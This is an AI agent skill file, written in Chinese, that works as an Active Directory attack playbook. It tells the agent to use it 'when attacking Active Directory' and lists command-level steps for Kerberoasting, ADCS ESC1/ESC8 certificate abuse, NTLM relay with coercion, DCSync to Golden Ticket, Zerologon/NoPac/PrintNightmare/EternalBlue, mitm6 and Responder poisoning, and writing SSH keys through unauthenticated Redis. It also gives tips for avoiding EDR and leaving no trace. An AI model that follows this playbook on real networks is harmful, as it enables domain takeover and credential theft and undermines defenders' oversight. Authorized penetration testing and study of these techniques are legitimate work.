---
name: active-directory-attack
description: >-
  内网域攻击:BloodHound,Kerberoast,ADCS ESC1/ESC8,NTLM Relay,Coerce,DACL,DCSync,Zerologon/NoPac/PrintNightmare,mitm6,LLMNR,Linux内网。Use when attacking Active Directory, ADCS, NTLM relay, or internal domain.
metadata:
  tags: [渗透测试, penetration-testing, 红队]
---

## 内网域攻击

```
=== 内网域(2023+真实主战场) ===
侦察: BloodHound(SharpHound收集→攻击路径) | Kerberos: GetNPUsers(AS-REP)/GetUserSPNs(Kerberoast)
🚨ADCS(Certipy一把梭): certipy find -vulnerable | ESC1指定SAN申域管证书 | ESC8 relay到CA拿DC证书
🚨NTLM Relay(比PtH重要,PtH常被EDR拦): ntlmrelayx -t ldap--escalate-user / -t http CA --adcs(ESC8) / RBCD
🚨强制认证Coerce: PetitPotam(MS-EFSRPC)/coercer全协议喷/printerbug → 喂给relay
🚨DACL滥用: WriteDACL→给自己加DCSync | 影子凭据certipy shadow(GenericWrite即可,不改密码不留痕)
DCSync: secretsdump -just-dc → krbtgt hash→Golden Ticket
🚨一击致命域CVE(先测,命中直接域管): Zerologon(CVE-2020-1472,置空DC机器账户密码→DCSync) | NoPac(CVE-2021-42278/42287,机器账户改名申DC TGT) | PrintNightmare(CVE-2021-34527,后台打印RCE/加载恶意驱动) | EternalBlue(MS17-010,老SMBv1直RCE)
🚨IPv6/mitm6(默认双栈内网必打): mitm6劫持DHCPv6+DNS→WPAD→ntlmrelayx到LDAP/ADCS(比LLMNR更隐蔽,现代内网首选)
LLMNR/NBT-NS投毒: responder抓NetNTLMv2→hashcat破/relay
Linux内网: Redis未授权(CONFIG SET dir写SSH key) | NFS showmount | Docker 2375
```
